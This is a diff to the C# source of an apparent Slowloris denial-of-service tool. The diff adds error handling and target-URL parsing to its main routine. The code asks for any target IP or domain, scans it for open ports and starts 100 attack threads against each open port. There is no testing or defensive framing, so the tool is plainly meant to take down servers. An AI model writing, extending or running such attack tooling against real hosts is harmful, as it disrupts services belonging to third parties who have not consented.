@@ -22,37 +22,44 @@ namespace SlowLoris
 
         static void Main()
         {
-            Console.Write("Enter the Targets I.P or Domain : ");
-            string target = Console.ReadLine();
-
-            int threadSleep = 20000;
-
-            IPAddress ipAddress = GetAddress(target);
-
-            ThreadPool.QueueUserWorkItem(StartScan, ipAddress);
-
-            Console.WriteLine("Wait for the Thread to finish or press ENTER");
-
-            Console.ReadKey();
-
-            _stop = true;
-
-            Console.Clear();
-            Console.WriteLine("Waiting for sockets");
-            Thread.Sleep(20000);
-
-            Console.Clear();
-
-            foreach (int openPort in OpenPorts)
+            try
             {
-                for (int i = 0; i < 100; i++)
-                {
-                    SlowlorisAttack slow = new SlowlorisAttack(target, openPort, threadSleep, true, i);
-                    ThreadStart st = new ThreadStart(slow.Manage);
+                Console.Write("Enter the Targets I.P or Domain : ");
+                string target = Console.ReadLine();
 
-                    Thread slowThread = new Thread(st);
-                    slowThread.Start();
+                int threadSleep = 20000;
+
+                IPAddress ipAddress = GetAddress(target);
+
+                ThreadPool.QueueUserWorkItem(StartScan, ipAddress);
+
+                Console.WriteLine("Wait for the Thread to finish or press ENTER");
+
+                Console.ReadKey();
+
+                _stop = true;
+
+                Console.Clear();
+                Console.WriteLine("Waiting for sockets");
+                Thread.Sleep(20000);
+
+                Console.Clear();
+
+                foreach (int openPort in OpenPorts)
+                {
+                    for (int i = 0; i < 100; i++)
+                    {
+                        SlowlorisAttack slow = new SlowlorisAttack(target, openPort, threadSleep, i);
+                        ThreadStart st = new ThreadStart(slow.Manage);
+
+                        Thread slowThread = new Thread(st);
+                        slowThread.Start();
+                    }
                 }
+            }
+            catch (Exception ex)
+            {
+                Console.WriteLine(ex.Message + "|" + ex.StackTrace);
             }
         }
 
@@ -65,12 +72,19 @@ namespace SlowLoris
         {
             if (ip.Contains("www"))
                 if (ip.Contains("https"))
-                    return Dns.GetHostAddresses(ip.Replace("https://", ""))[0];
+                    if (ip.EndsWith("/"))
+                    {
+                        string retVal = ip.Replace("https://", "");
+                        return Dns.GetHostAddresses(retVal.Substring(0, retVal.Length-1))[0];
+                    }else
+                        return Dns.GetHostAddresses(ip.Replace("https://", ""))[0];
                 else
                     return Dns.GetHostAddresses(ip)[0];
             else
                 return IPAddress.Parse(ip);
         }  
+
+
 
         #region GetPorts
 
